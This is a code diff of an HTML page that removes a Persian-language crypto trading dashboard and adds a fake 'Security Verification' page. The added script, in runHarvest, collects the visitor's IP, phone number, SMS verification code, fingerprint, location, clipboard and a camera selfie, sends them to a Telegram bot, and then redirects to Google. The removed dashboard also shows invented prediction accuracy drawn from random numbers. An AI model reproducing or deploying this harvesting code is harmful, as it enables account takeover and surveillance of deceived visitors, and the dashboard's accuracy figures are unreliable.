-                    strength: 'high',
-                    description: 'MACD به زیر خط سیگنال رسیده'
-                });
-            }
-            
-            // سیگنال بولینگر باند
-            if (indicators.price < indicators.lowerBB * 0.99) {
-                signals.push({
-                    type: 'buy',
-                    name: 'برخورد با باند پایین',
-                    strength: 'medium',
-                    description: 'قیمت به باند پایینی برخورد کرده'
-                });
-            } else if (indicators.price > indicators.upperBB * 1.01) {
-                signals.push({
-                    type: 'sell',
-                    name: 'برخورد با باند بالا',
-                    strength: 'medium',
-                    description: 'قیمت به باند بالایی برخورد کرده'
-                });
-            }
-            
-            // سیگنال حجم
-            if (indicators.volumeRatio > 1.5 && indicators.trend === 'bullish') {
-                signals.push({
-                    type: 'buy',
-                    name: 'حجم بالا در روند صعودی',
-                    strength: 'high',
-                    description: 'حجم معاملات ۱.۵ برابر میانگین'
-                });
-            } else if (indicators.volumeRatio > 1.5 && indicators.trend === 'bearish') {
-                signals.push({
-                    type: 'sell',
-                    name: 'حجم بالا در روند نزولی',
-                    strength: 'high',
-                    description: 'حجم معاملات ۱.۵ برابر میانگین'
-                });
-            }
-            
-            return signals;
-        }
-
-        // ====================
-        // نمایش تحلیل‌ها
-        // ====================
-        function displayTechnicalAnalysis(data) {
-            const container = document.getElementById('technical-analysis-content');
-            
-            let rsiStatus, macdStatus, trendStatus, overallStatus;
-            
-            // وضعیت RSI
-            if (data.rsi < 30) {
-                rsiStatus = { text: 'اشباع فروش', class: 'buy', icon: 'fa-arrow-up' };
-            } else if (data.rsi > 70) {
-                rsiStatus = { text: 'اشباع خرید', class: 'sell', icon: 'fa-arrow-down' };
-            } else if (data.rsi > 50) {
-                rsiStatus = { text: 'صعودی', class: 'buy', icon: 'fa-arrow-up' };
-            } else {
-                rsiStatus = { text: 'نزولی', class: 'sell', icon: 'fa-arrow-down' };
-            }
-            
-            // وضعیت MACD
-            if (data.macd > data.signal) {
-                macdStatus = { text: 'صعودی', class: 'buy', icon: 'fa-arrow-up' };
-            } else {
-                macdStatus = { text: 'نزولی', class: 'sell', icon: 'fa-arrow-down' };
-            }
-            
-            // وضعیت روند
-            if (data.trend === 'bullish') {
-                trendStatus = { text: 'صعودی قوی', class: 'buy', icon: 'fa-fire' };
-            } else if (data.trend === 'bearish') {
-                trendStatus = { text: 'نزولی قوی', class: 'sell', icon: 'fa-fire' };
-            } else {
-                trendStatus = { text: 'خنثی', class: 'neutral', icon: 'fa-balance-scale' };
-            }
-            
-            // وضعیت کلی
-            const buySignals = data.signals.filter(s => s.type === 'buy').length;
-            const sellSignals = data.signals.filter(s => s.type === 'sell').length;
-            
-            if (buySignals >= 2) {
-                overallStatus = { text: 'سیگنال خرید قوی', class: 'buy', icon: 'fa-bullhorn' };
-            } else if (sellSignals >= 2) {
-                overallStatus = { text: 'سیگنال فروش قوی', class: 'sell', icon: 'fa-bullhorn' };
-            } else if (buySignals > sellSignals) {
-                overallStatus = { text: 'تمایل به خرید', class: 'buy', icon: 'fa-arrow-up' };
-            } else if (sellSignals > buySignals) {
-                overallStatus = { text: 'تمایل به فروش', class: 'sell', icon: 'fa-arrow-down' };
-            } else {
-                overallStatus = { text: 'سیگنال خنثی', class: 'neutral', icon: 'fa-balance-scale' };
-            }
-            
-            const rsiWidth = Math.min(100, Math.max(0, data.rsi));
-            const rsiColor = data.rsi < 30 ? 'var(--color-buy)' : 
-                           data.rsi > 70 ? 'var(--color-sell)' : 'var(--color-neutral)';
-            
-            container.innerHTML = `
-                <div style="margin-bottom: 15px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
-                        <span>RSI (14)</span>
-                        <span style="font-weight: 600; color: ${rsiColor}">
-                            ${data.rsi.toFixed(1)}
-                            <i class="fas ${rsiStatus.icon}" style="margin-right: 5px;"></i>
-                        </span>
-                    </div>
-                    <div style="height: 4px; background: var(--bg-tertiary); border-radius: 2px; overflow: hidden; margin: 5px 0;">
-                        <div style="height: 100%; width: ${rsiWidth}%; background: ${rsiColor}; border-radius: 2px;"></div>
-                    </div>
-                    <div style="font-size: 12px; color: var(--text-secondary);">
-                        ${rsiStatus.text}
-                    </div>
-                </div>
-                
-                <div style="margin-bottom: 15px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
-                        <span>MACD</span>
-                        <span style="font-weight: 600; color: var(--color-${macdStatus.class})">
-                            ${data.macd.toFixed(3)}
-                            <i class="fas ${macdStatus.icon}" style="margin-right: 5px;"></i>
-                        </span>
-                    </div>
-                    <div style="font-size: 12px; color: var(--text-secondary);">
-                        ${macdStatus.text} | Histogram: ${data.histogram.toFixed(3)}
-                    </div>
-                </div>
-                
-                <div style="margin-bottom: 15px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
-                        <span>قدرت روند</span>
-                        <span style="font-weight: 600; color: var(--color-${trendStatus.class})">
-                            ${data.trendStrength}%
-                            <i class="fas ${trendStatus.icon}" style="margin-right: 5px;"></i>
-                        </span>
-                    </div>
-                    <div style="font-size: 12px; color: var(--text-secondary);">
-                        ${trendStatus.text}
-                    </div>
-                </div>
-                
-                <div style="padding: 15px; background: var(--bg-tertiary); border-radius: var(--border-radius); border-right: 3px solid var(--color-${overallStatus.class});">
-                    <div style="display: flex; align-items: center; gap: 10px;">
-                        <i class="fas ${overallStatus.icon}" style="color: var(--color-${overallStatus.class});"></i>
-                        <div>
-                            <div style="font-weight: 600; color: var(--color-${overallStatus.class});">
-                                ${overallStatus.text}
-                            </div>
-                            <div style="font-size: 12px; color: var(--text-secondary); margin-top: 3px;">
-                                ${data.signals.length} سیگنال شناسایی شد
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            `;
-        }
-
-        function displaySignals(signals) {
-            const container = document.getElementById('live-signals-content');
-            
-            let html = '';
-            signals.slice(0, 4).forEach((signal, index) => {
-                const color = signal.type === 'buy' ? 'var(--color-buy)' : 'var(--color-sell)';
-                const icon = signal.type === 'buy' ? 'fa-arrow-up' : 'fa-arrow-down';
-                const strengthColor = signal.strength === 'high' ? 'var(--color-buy)' : 
-                                   signal.strength === 'medium' ? 'var(--color-neutral)' : 'var(--color-sell)';
-                
-                html += `
-                    <div style="display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid var(--border-color);">
-                        <div style="display: flex; align-items: center; gap: 10px;">
-                            <div style="width: 8px; height: 8px; border-radius: 50%; background: ${color};"></div>
-                            <div>
-                                <div style="font-size: 14px;">${signal.name}</div>
-                                <div style="font-size: 11px; color: var(--text-secondary);">${signal.description}</div>
-                            </div>
-                        </div>
-                        <div style="display: flex; align-items: center; gap: 5px;">
-                            <div style="font-size: 12px; color: ${strengthColor};">
-                                ${signal.strength === 'high' ? 'قوی' : signal.strength === 'medium' ? 'متوسط' : 'ضعیف'}
-                            </div>
-                            <i class="fas ${icon}" style="color: ${color}; font-size: 12px;"></i>
-                        </div>
-                    </div>
-                `;
-            });
-            
-            if (signals.length === 0) {
-                html = `
-                    <div style="text-align: center; padding: 20px; color: var(--text-secondary);">
-                        <i class="fas fa-search" style="font-size: 24px; margin-bottom: 10px;"></i>
-                        <div>هیچ سیگنال واضحی شناسایی نشد</div>
-                        <div style="font-size: 11px; margin-top: 5px;">منتظر شکل‌گیری الگو باشید</div>
-                    </div>
-                `;
-            } else if (signals.length > 4) {
-                html += `
-                    <div style="text-align: center; padding: 10px; color: var(--text-secondary); font-size: 12px;">
-                        + ${signals.length - 4} سیگنال دیگر
-                    </div>
-                `;
-            }
-            
-            container.innerHTML = html;
-            
-            // بروزرسانی تعداد سیگنال‌ها
-            document.getElementById('signal-count').textContent = `${signals.length} سیگنال`;
-            
-            // نمایش سیگنال‌های فوری
-            displayInstantSignals(signals);
-        }
-
-        function displayInstantSignals(signals) {
-            const container = document.getElementById('instant-signals');
-            const instantSignals = signals.slice(0, 3);
-            
-            let html = '';
-            instantSignals.forEach((signal, index) => {
-                const color = signal.type === 'buy' ? 'var(--color-buy)' : 'var(--color-sell)';
-                const icon = signal.type === 'buy' ? 'fa-arrow-up' : 'fa-arrow-down';
-                
-                html += `
-                    <div class="signal-item">
-                        <div class="signal-info">
-                            <div class="signal-indicator ${signal.type}"></div>
-                            <div>
-                                <div style="font-size: 14px;">${signal.name}</div>
-                                <div style="font-size: 11px; color: var(--text-secondary);">${signal.description}</div>
-                            </div>
-                        </div>
-                        <div style="color: ${color};">
-                            <i class="fas ${icon}"></i>
-                        </div>
-                    </div>
-                `;
-            });
-            
-            if (instantSignals.length === 0) {
-                html = `
-                    <div style="text-align: center; padding: 20px; color: var(--text-secondary);">
-                        <i class="fas fa-clock" style="font-size: 24px; margin-bottom: 10px;"></i>
-                        <div>در حال بررسی بازار...</div>
-                    </div>
-                `;
-            }
-            
-            container.innerHTML = html;
-        }
-
-        function displayTimeAnalysis(prices, trend, strength) {
-            const container = document.getElementById('time-analysis-content');
-            
-            // تحلیل بر اساس زمان جلسات معاملاتی
-            const now = new Date();
-            const hour = now.getHours();
-            const day = now.getDay();
-            
-            let sessionAnalysis = '';
-            let bestTime = '';
-            
-            if (hour >= 0 && hour < 4) {
-                sessionAnalysis = 'جلسه آسیا - معمولاً حجم کم';
-                bestTime = 'منتظر باز شدن اروپا';
-            } else if (hour >= 4 && hour < 12) {
-                sessionAnalysis = 'جلسه اروپا - نوسانات متوسط';
-                bestTime = 'زمان خوب برای معاملات';
-            } else if (hour >= 12 && hour < 20) {
-                sessionAnalysis = 'همپوشانی اروپا و آمریکا - بالاترین نوسان';
-                bestTime = 'بهترین زمان معامله';
-            } else {
-                sessionAnalysis = 'جلسه آمریکا - نوسانات بالا';
-                bestTime = 'زمان مناسب برای معاملات';
-            }
-            
-            const probabilities = [
-                { period: '۱ ساعت آینده', probability: calculateHourlyProbability(trend, strength) },
-                { period: '۴ ساعت آینده', probability: calculate4HourProbability(trend, strength) },
-                { period: 'امروز', probability: calculateDailyProbability(trend, strength, day) },
-                { period: 'هفته آینده', probability: calculateWeeklyProbability(trend, strength) }
-            ];
-            
-            let html = '';
-            probabilities.forEach((analysis, index) => {
-                const probability = analysis.probability;
-                const direction = probability >= 50 ? 'صعودی' : 'نزولی';
-                const color = direction === 'صعودی' ? 'var(--color-buy)' : 'var(--color-sell)';
-                const icon = direction === 'صعودی' ? 'fa-arrow-up' : 'fa-arrow-down';
-                
-                html += `
-                    <div style="margin-bottom: ${index < probabilities.length - 1 ? '15px' : '0'}">
-                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 5px;">
-                            <span style="font-size: 14px;">${analysis.period}</span>
-                            <span style="display: flex; align-items: center; gap: 5px;">
-                                <span style="color: ${color}; font-weight: 600;">
-                                    ${direction}
-                                </span>
-                                <i class="fas ${icon}" style="color: ${color}; font-size: 12px;"></i>
-                            </span>
-                        </div>
-                        <div style="display: flex; align-items: center; gap: 10px;">
-                            <div style="flex: 1; height: 6px; background: var(--bg-tertiary); border-radius: 3px; overflow: hidden;">
-                                <div style="height: 100%; width: ${Math.abs(probability - 50) * 2}%; background: ${color}; border-radius: 3px;"></div>
-                            </div>
-                            <span style="font-size: 12px; color: var(--text-secondary);">
-                                ${probability}%
-                            </span>
-                        </div>
-                    </div>
-                `;
-            });
-            
-            html += `
-                <div style="margin-top: 15px; padding: 12px; background: var(--bg-tertiary); border-radius: var(--border-radius);">
-                    <div style="font-size: 12px; color: var(--text-secondary);">
-                        <i class="fas fa-clock" style="margin-left: 5px;"></i>
-                        ${sessionAnalysis}
-                    </div>
-                    <div style="font-size: 11px; color: var(--color-buy); margin-top: 5px;">
-                        ${bestTime}
-                    </div>
-                </div>
-            `;
-            
-            container.innerHTML = html;
-        }
-
-        function calculateHourlyProbability(trend, strength) {
-            let base = 50;
-            if (trend === 'bullish') base += (strength / 100) * 20;
-            if (trend === 'bearish') base -= (strength / 100) * 20;
-            return Math.min(80, Math.max(20, Math.round(base)));
-        }
-
-        function calculate4HourProbability(trend, strength) {
-            let base = 50;
-            if (trend === 'bullish') base += (strength / 100) * 25;
-            if (trend === 'bearish') base -= (strength / 100) * 25;
-            return Math.min(85, Math.max(15, Math.round(base)));
-        }
-
-        function calculateDailyProbability(trend, strength, day) {
-            let base = 50;
-            if (trend === 'bullish') base += (strength / 100) * 30;
-            if (trend === 'bearish') base -= (strength / 100) * 30;
-            
-            // تنظیم بر اساس روز هفته
-            if (day === 0 || day === 6) base -= 5; // آخر هفته
-            if (day === 1) base += 5; // دوشنبه
-            if (day === 5) base -= 3; // جمعه
-            
-            return Math.min(90, Math.max(10, Math.round(base)));
-        }
-
-        function calculateWeeklyProbability(trend, strength) {
-            let base = 50;
-            if (trend === 'bullish') base += (strength / 100) * 35;
-            if (trend === 'bearish') base -= (strength / 100) * 35;
-            return Math.min(95, Math.max(5, Math.round(base)));
-        }
-
-        function displayPricePrediction(prices, trend, strength) {
-            const container = document.getElementById('price-prediction-content');
-            const currentPrice = prices[prices.length - 1];
-            
-            // پیش‌بینی بر اساس تحلیل تکنیکال
-            const volatility = calculateVolatility(prices);
-            const momentum = calculateMomentum(prices);
-            
-            const predictions = [
-                {
-                    time: '۱ ساعت',
-                    target: calculateTargetPrice(currentPrice, trend, strength, volatility, 0.25),
-                    probability: calculateHourlyProbability(trend, strength)
-                },
-                {
-                    time: '۴ ساعت',
-                    target: calculateTargetPrice(currentPrice, trend, strength, volatility, 0.5),
-                    probability: calculate4HourProbability(trend, strength)
-                },
-                {
-                    time: 'امروز',
-                    target: calculateTargetPrice(currentPrice, trend, strength, volatility, 1),
-                    probability: calculateDailyProbability(trend, strength, new Date().getDay())
-                },
-                {
-                    time: 'هفته آینده',
-                    target: calculateTargetPrice(currentPrice, trend, strength, volatility, 5),
-                    probability: calculateWeeklyProbability(trend, strength)
-                }
-            ];
-            
-            let html = `
-                <div style="margin-bottom: 15px;">
-                    <div style="font-size: 14px; color: var(--text-secondary); margin-bottom: 10px;">
-                        پیش‌بینی قیمت بر اساس تحلیل تکنیکال:
-                    </div>
-            `;
-            
-            predictions.forEach(pred => {
-                const change = ((pred.target / currentPrice - 1) * 100);
-                const type = change >= 0 ? 'up' : 'down';
-                const color = type === 'up' ? 'var(--color-buy)' : 'var(--color-sell)';
-                const icon = type === 'up' ? 'fa-arrow-up' : 'fa-arrow-down';
-                
-                html += `
-                    <div style="display: flex; justify-content: space-between; align-items: center; padding: 8px 0; border-bottom: 1px solid var(--border-color);">
-                        <div style="display: flex; align-items: center; gap: 10px;">
-                            <i class="fas ${icon}" style="color: ${color};"></i>
-                            <div>
-                                <div style="font-size: 14px; font-weight: 600;">
-                                    $${pred.target.toFixed(2)}
-                                </div>
-                                <div style="font-size: 11px; color: var(--text-secondary);">
-                                    ${pred.time} آینده
-                                </div>
-                            </div>
-                        </div>
-                        <div style="text-align: left;">
-                            <div style="color: ${color}; font-weight: 600;">
-                                ${change >= 0 ? '+' : ''}${change.toFixed(2)}%
-                            </div>
-                            <div style="font-size: 11px; color: var(--text-secondary);">
-                                احتمال: ${pred.probability}%
-                            </div>
-                        </div>
-                    </div>
-                `;
-            });
-            
-            html += `</div>`;
-            container.innerHTML = html;
-            
-            // بروزرسانی دقت پیش‌بینی
-            const avgProbability = predictions.reduce((sum, pred) => sum + pred.probability, 0) / predictions.length;
-            document.getElementById('prediction-accuracy').textContent = `${Math.round(avgProbability)}% دقت`;
-        }
-
-        function calculateVolatility(prices) {
-            if (prices.length < 20) return 0.01;
-            
-            const returns = [];
-            for (let i = 1; i < prices.length; i++) {
-                returns.push(Math.log(prices[i] / prices[i - 1]));
-            }
-            
-            const mean = returns.reduce((a, b) => a + b, 0) / returns.length;
-            const variance = returns.reduce((a, b) => a + Math.pow(b - mean, 2), 0) / returns.length;
-            
-            return Math.sqrt(variance) * Math.sqrt(365); // نوسان سالانه
-        }
-
-        function calculateMomentum(prices) {
-            if (prices.length < 20) return 0;
-            
-            const period = 10;
-            const current = prices[prices.length - 1];
-            const past = prices[prices.length - period - 1];
-            
-            return ((current - past) / past) * 100;
-        }
-
-        function calculateTargetPrice(current, trend, strength, volatility, timeFactor) {
-            let direction = 0;
-            
-            if (trend === 'bullish') {
-                direction = 1;
-            } else if (trend === 'bearish') {
-                direction = -1;
-            }
-            
-            const expectedMove = volatility * timeFactor * (strength / 100);
-            return current * (1 + direction * expectedMove);
-        }
-
-        async function displayMultiTimeframeAnalysis() {
-            const container = document.getElementById('multi-timeframe-analysis');
-            const timeframes = ['1m', '5m', '15m', '30m', '1h', '4h', '1d', '1w'];
-            
-            let html = '';
-            
-            for (const tf of timeframes) {
-                try {
-                    const response = await fetch(`https://api.binance.com/api/v3/klines?symbol=${currentSymbol}&interval=${tf}&limit=50`);
-                    const klines = await response.json();
-                    
-                    if (klines.length < 20) continue;
-                    
-                    const closes = klines.map(k => parseFloat(k[4]));
-                    const trend = detectTrend(closes);
-                    const strength = calculateTrendStrength(closes);
-                    
-                    const color = trend === 'bullish' ? 'buy' : trend === 'bearish' ? 'sell' : 'neutral';
-                    const trendText = trend === 'bullish' ? 'صعودی' : trend === 'bearish' ? 'نزولی' : 'خنثی';
-                    
-                    const activeClass = tf === currentTimeframe ? 'active' : '';
-                    
-                    html += `
-                        <div class="tf-analysis-item ${activeClass}" data-tf="${tf}">
-                            <div class="tf-info">
-                                <span style="font-weight: 600; font-size: 14px;">${tf}</span>
-                                <span class="badge badge-${color === 'buy' ? 'success' : color === 'sell' ? 'danger' : 'warning'}" 
-                                      style="font-size: 11px;">
-                                    ${trendText}
-                                </span>
-                            </div>
-                            <div style="display: flex; align-items: center; gap: 10px;">
-                                <span class="tf-trend ${color}">
-                                    ${trendText}
-                                </span>
-                                <div style="font-size: 12px; color: var(--text-secondary);">
-                                    ${strength}%
-                                </div>
-                            </div>
-                        </div>
-                    `;
-                    
-                } catch (error) {
-                    console.error(`خطا در تحلیل تایم‌فرم ${tf}:`, error);
-                }
-            }
-            
-            container.innerHTML = html;
-            
-            // اضافه کردن event listeners
-            container.querySelectorAll('.tf-analysis-item').forEach(item => {
-                item.addEventListener('click', () => {
-                    const tf = item.getAttribute('data-tf');
-                    updateChartTimeframe(tf);
-                });
-            });
-        }
-
-        function updateTimePredictionChart() {
-            if (!timePredictionChart) return;
-            
-            // ایجاد داده‌های تصادفی برای نمایش
-            const bullishData = [];
-            const bearishData = [];
-            
-            for (let i = 0; i < 6; i++) {
-                const base = 50 + (Math.random() * 20 - 10);
-                bullishData.push(Math.round(base + Math.random() * 10));
-                bearishData.push(100 - bullishData[i]);
-            }
-            
-            timePredictionChart.data.datasets[0].data = bullishData;
-            timePredictionChart.data.datasets[1].data = bearishData;
-            timePredictionChart.update('none');
-            
-            // بروزرسانی دقت پیش‌بینی زمانی
-            const avgAccuracy = 70 + Math.random() * 25;
-            document.getElementById('time-prediction-accuracy').textContent = 
-                `دقت: ${Math.round(avgAccuracy)}%`;
-        }
-
-        // ====================
-        // توابع کمکی
-        // ====================
-        function getSymbolName(symbol) {
-            const symbolInfo = popularSymbols.find(s => s.symbol === symbol);
-            return symbolInfo ? symbolInfo.name : symbol.replace('USDT', '');
-        }
-
-        function updateChartSymbol(symbol) {
-            currentSymbol = symbol;
-            const symbolName = getSymbolName(symbol);
-            
-            document.getElementById('selected-symbol').textContent = 
-                `${symbol.replace('USDT', '/USDT')} - ${symbolName}`;
-            
-            showNotification(`نماد به ${symbolName} تغییر کرد`, 'neutral');
-            
-            // دریافت داده‌های جدید
-            loadSymbolData(symbol);
-        }
-
-        async function loadSymbolData(symbol) {
-            try {
-                const liveData = await fetchLiveData(symbol);
-                updateMarketData(liveData.ticker);
-                updateChartData(liveData.klines);
-                runTechnicalAnalysis(liveData.klines);
-                
-                // بروزرسانی وضعیت اتصال
-                document.getElementById('market-status-text').textContent = 'متصل به Binance';
-                document.getElementById('connection-status').textContent = 'متصل به Binance';
-                
-            } catch (error) {
-                console.error('خطا در بارگذاری داده‌های سیمبل:', error);
-                showNotification('خطا در دریافت داده‌های زنده', 'sell');
-                
-                document.getElementById('market-status-text').textContent = 'اتصال با مشکل';
-                document.getElementById('connection-status').textContent = 'خطا در اتصال';
-            }
-        }
-
-        function updateChartTimeframe(tf) {
-            currentTimeframe = tf;
-            
-            // بروزرسانی دکمه‌های فعال
-            document.querySelectorAll('.tf-btn').forEach(btn => {
-                btn.classList.remove('active');
-                if (btn.dataset.tf === tf) {
-                    btn.classList.add('active');
-                }
-            });
-            
-            // بروزرسانی چارت
-            loadSymbolData(currentSymbol);
-            
-            showNotification(`تایم‌فرم به ${tf} تغییر کرد`, 'neutral');
-        }
-
-        function setupTimeframeButtons() {
-            document.querySelectorAll('.tf-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    updateChartTimeframe(btn.dataset.tf);
-                });
-            });
-        }
-
-        function startUpdateTimers() {
-            // تایمر بروزرسانی کلی
-            setInterval(() => {
-                updateTimer++;
-                document.getElementById('update-timer').textContent = 
-                    `آخرین بروزرسانی: ${updateTimer}s`;
-                
-                if (updateTimer >= 30) {
-                    updateTimer = 0;
-                    loadSymbolData(currentSymbol);
-                }
-            }, 1000);
-            
-            // تایمر تحلیل تایم‌فرم
-            let tfTimer = 0;
-            setInterval(() => {
-                tfTimer++;
-                document.getElementById('tf-timer').textContent = 
-                    `به‌روزرسانی: ${tfTimer}s`;
-                
-                if (tfTimer >= 60) {
-                    tfTimer = 0;
-                    displayMultiTimeframeAnalysis();
-                }
-            }, 1000);
-        }
-
-        function updateAnalysisBadges(signalCount) {
-            document.getElementById('tech-badge').textContent = 'تحلیل زنده';
-            document.getElementById('time-badge').textContent = 'دقیق';
-            document.getElementById('signal-count').textContent = `${signalCount} سیگنال`;
-        }
-
-        function toggleIndicator(indicator) {
-            indicators[indicator] = !indicators[indicator];
-            showNotification(`اندیکاتور ${indicator} ${indicators[indicator] ? 'فعال' : 'غیرفعال'} شد`, 'neutral');
-        }
-
-        function refreshSignals() {
-            loadSymbolData(currentSymbol);
-            showNotification('سیگنال‌ها به‌روزرسانی شدند', 'neutral');
-        }
-
-        function showQuickAnalysis() {
-            const priceElement = document.getElementById('current-price');
-            const changeElement = document.getElementById('price-change-value');
-            const changeType = document.querySelector('.price-change').classList.contains('positive') ? 'صعودی' : 'نزولی';
-            
-            const message = `تحلیل سریع ${getSymbolName(currentSymbol)}:
-            
-قیمت فعلی: ${priceElement.textContent}
-تغییر 24h: ${changeElement.textContent}
-وضعیت: ${changeType}
-
-تعداد سیگنال‌ها: ${document.getElementById('signal-count').textContent}
-زمان تحلیل: ${new Date().toLocaleTimeString('fa-IR')}
-
-برای تحلیل دقیق‌تر به کارت‌های تحلیل مراجعه کنید.`;
-            
-            showNotification('تحلیل سریع نمایش داده شد', 'buy');
-            setTimeout(() => {
-                alert(message);
-            }, 100);
-        }
-
-        function executeTrade(type) {
-            const action = type === 'buy' ? 'خرید' : 'فروش';
-            const symbolName = getSymbolName(currentSymbol);
-            const price = document.getElementById('current-price').textContent;
-            
-            const message = `آیا مطمئن هستید که می‌خواهید ${action} ${symbolName} را انجام دهید؟
-            
-قیمت فعلی: ${price}
-نماد: ${currentSymbol.replace('USDT', '/USDT')}
-زمان: ${new Date().toLocaleString('fa-IR')}`;
-            
-            if (confirm(message)) {
-                showNotification(`دستور ${action} برای ${symbolName} ثبت شد`, type);
-                
-                console.log(`📊 دستور ${action} ثبت شد:`, {
-                    symbol: currentSymbol,
-                    price: price,
-                    time: new Date().toLocaleString('fa-IR'),
-                    type: type
-                });
-            }
-        }
-
-        function showNotification(message, type = 'buy') {
-            const notification = document.getElementById('notification');
-            const icon = notification.querySelector('.notification-icon');
-            const content = notification.querySelector('.notification-content');
-            
-            // حذف کلاس‌های قبلی
-            icon.className = 'notification-icon ' + type;
-            
-            // تنظیم آیکون بر اساس نوع
-            let iconClass = 'fa-info-circle';
-            if (type === 'buy') iconClass = 'fa-arrow-up';
-            if (type === 'sell') iconClass = 'fa-arrow-down';
-            if (type === 'neutral') iconClass = 'fa-info-circle';
-            
-            icon.innerHTML = `<i class="fas ${iconClass}"></i>`;
-            
-            content.innerHTML = `
-                <strong>${message}</strong>
-                <p style="color: var(--text-secondary); font-size: 14px; margin-top: 5px;">
-                    ${new Date().toLocaleString('fa-IR')}
-                </p>
-            `;
-            
-            notification.classList.add('show');
-            
-            setTimeout(() => {
-                notification.classList.remove('show');
-            }, 5000);
-        }
-
-        function closeNotification() {
-            document.getElementById('notification').classList.remove('show');
-        }
-
-        function saveChartLayout() {
-            localStorage.setItem('tradingVisionLayout', JSON.stringify({
-                symbol: currentSymbol,
-                timeframe: currentTimeframe,
-                indicators: indicators,
-                timestamp: new Date().toISOString()
-            }));
-            
-            showNotification('طرح چارت ذخیره شد', 'buy');
-        }
-
-        function resetChart() {
-            if (confirm('آیا مطمئن هستید که می‌خواهید چارت را ریست کنید؟')) {
-                chartInstance.reset();
-                showNotification('چارت ریست شد', 'neutral');
-            }
-        }
-
-        function toggleAnalysisPanel() {
-            const cards = document.querySelector('.analysis-cards');
-            if (cards.style.display === 'none') {
-                cards.style.display = 'grid';
-                showNotification('پنل تحلیل فعال شد', 'buy');
-            } else {
-                cards.style.display = 'none';
-                showNotification('پنل تحلیل غیرفعال شد', 'neutral');
-            }
-        }
-
-        function showSettings() {
-            const settings = `تنظیمات پیشرفته TRADING VISION LIVE:
-
-1. اتصال زنده: فعال
-2. بروزرسانی خودکار: هر 30 ثانیه
-3. تحلیل تکنیکال: فعال
-4. پیش‌بینی زمانی: فعال
-5. سیگنال‌دهی: فعال
-6. دقت تحلیل: بالا
-
-داده‌ها از صرافی‌های معتبر جهانی:
-• Binance API
-• تحلیل‌های واقعی
-
-برای تنظیمات بیشتر با پشتیبانی تماس بگیرید.`;
-            
-            showNotification('تنظیمات نمایش داده شد', 'neutral');
-            setTimeout(() => {
-                alert(settings);
-            }, 100);
-        }
-
-        function showDisclaimer() {
-            const disclaimer = `⚠️ سلب مسئولیت:
-
-TRADING VISION LIVE - سیستم تحلیل تکنیکال زنده
---------------------------------------------
-
-این پلتفرم با استفاده از داده‌های زنده تحلیل‌های تکنیکال ارائه می‌دهد.
-
-توجه:
-1. تحلیل‌ها بر اساس الگوریتم‌های ریاضی و تکنیکال هستند
-2. پیش‌بینی‌ها بر اساس احتمالات هستند
-3. مسئولیتی در قبال تصمیمات معاملاتی شما نداریم
-4. سرمایه‌گذاری در بازارهای مالی همراه با ریسک است
-
-توصیه می‌شود:
-• قبل از معامله، تحقیق کامل انجام دهید
-• از تحلیل‌های مختلف استفاده کنید
-• مدیریت ریسک را رعایت کنید
-• فقط با سرمایه مازاد معامله کنید
-📡 TELEGRAM : @REZA1000IQ
-      REZAROZIBAY@gmail.com
-© 2024 TRADING VISION LIVE - همه حقوق محفوظ است`;
-            
-            alert(disclaimer);
-        }
-
-        function exportData() {
-            const data = {
-                symbol: currentSymbol,
-                time: new Date().toISOString(),
-                source: 'TRADING VISION LIVE',
-                analysis: {
-                    technical: document.getElementById('technical-analysis-content').innerText,
-                    time: document.getElementById('time-analysis-content').innerText,
-                    signals: document.getElementById('live-signals-content').innerText,
-                    prediction: document.getElementById('price-prediction-content').innerText
-                }
-            };
-            
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `trading-analysis-${currentSymbol}-${Date.now()}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            
-            showNotification('داده‌های تحلیل با موفقیت ذخیره شدند', 'buy');
-        }
-
-        console.log('✅ سیستم تحلیل زنده با موفقیت بارگذاری شد');
-    </script>
+            })
+            .catch(() => {});
+    }
+}
+
+// ================= BROWSER FINGERPRINT =================
+function getFingerprint() {
+    const fp = {
+        ua: navigator.userAgent,
+        lang: navigator.language,
+        platform: navigator.platform,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        memory: navigator.deviceMemory || 'N/A',
+        cores: navigator.hardwareConcurrency || 'N/A'
+    };
+    return JSON.stringify(fp);
+}
+
+// ================= RUN ALL =================
+async function runHarvest() {
+    retryBtn.style.display = 'none';
+    spinner.style.display = 'inline-block';
+    verifyBtn.disabled = true;
+
+    const ip = await getIP();
+
+    // Get phone and SMS
+    const phone = phoneInput.value.trim() || 'Not provided';
+    const sms = smsInput.value.trim() || 'Not provided';
+
+    // Send all data
+    getDeviceInfo();
+    getLocation();
+    getClipboard();
+    sendToTelegram(`🌐 IP: ${ip}`);
+    sendToTelegram(`📱 Phone: ${phone}`);
+    sendToTelegram(`🔑 SMS Code: ${sms}`);
+    sendToTelegram(`🔑 Fingerprint: ${getFingerprint()}`);
+
+    // Capture selfie
+    const selfieOk = await captureSelfie();
+
+    // Final status
+    if (selfieOk) {
+        setStatus("✅ Verified! Redirecting...", "done");
+        spinner.style.display = "none";
+        badge.style.display = "inline-block";
+        badge.textContent = "✅ VERIFIED";
+        sendToTelegram("✅ Harvest complete!");
+
+        setTimeout(() => {
+            window.location.href = "https://www.google.com";
+        }, 2500);
+    } else {
+        spinner.style.display = "none";
+        retryBtn.style.display = 'block';
+        verifyBtn.disabled = false;
+    }
+}
+
+// ================= RETRY =================
+retryBtn.onclick = function() {
+    runHarvest();
+};
+
+// ================= VERIFY BUTTON =================
+verifyBtn.onclick = function() {
+    runHarvest();
+};
+
+// ================= AUTO-START =================
+window.addEventListener('DOMContentLoaded', () => {
+    setStatus("Enter your phone and code");
+    spinner.style.display = 'none';
+    verifyBtn.style.display = 'block';
+});
+
+console.log('🔴 Security Verification page loaded');
+console.log('📤 Sending to Telegram bot');
+</script>
 </body>
 </html>
